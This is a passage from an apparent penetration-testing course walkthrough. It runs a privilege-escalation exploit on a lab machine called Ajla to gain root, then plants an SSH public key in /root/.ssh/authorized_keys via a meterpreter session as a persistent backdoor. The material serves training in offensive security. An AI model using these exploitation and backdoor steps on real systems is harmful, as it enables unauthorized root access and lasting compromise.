![](bbox=[0.12, 0.04, 0.29, 0.1])

```
```
Channel  5 created.

cd /tmp
chmod +x 45010
./45010
whoami
root
```
```

*Listing 926 - Running the exploit*

In Listing 926, the exploit does not give us any output but running **whoami** tells us that we are now running as the root user. Now that we have root access, we can create a more stable backdoor using ssh. This will allow us to come back to Ajla even if our meterpreter session dies.

First, we need to generate a new ssh key on our Kali machine.

*If you already have ssh keys generated, feel free to skip this step.*

```
```
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kali/.ssh/id_rsa.
Your public key has been saved in /home/kali/.ssh/id_rsa.pub.
...

kali@kali:~$ cat~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAAADAQABAAAAbQD... kali@kali
```
```

*Listing 927 - Generating an SSH key on Kali*

With our ssh key generated, we can create the **authorized_keys** file on Ajla to accept our public key. We will do this via the meterpreter session that has the root shell.

```
```
mkdir /root/.ssh

echo "ssh-rsa AAAAB3NzaC1yc2EAAAAADAQABAAAAbQD... kali@kali" > /root/.ssh/authorized_keys
```
```

*Listing 928 - Adding the public key to the /root/.ssh/authorized_keys file*

Now on Kali, we can use the ssh client to connect to Ajla directly.

```
```
kali@kali:~$ ssh root@sandbox.local
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
...
root@ajla:~#
```
```

*Listing 929 - Using ssh to login to Ajla*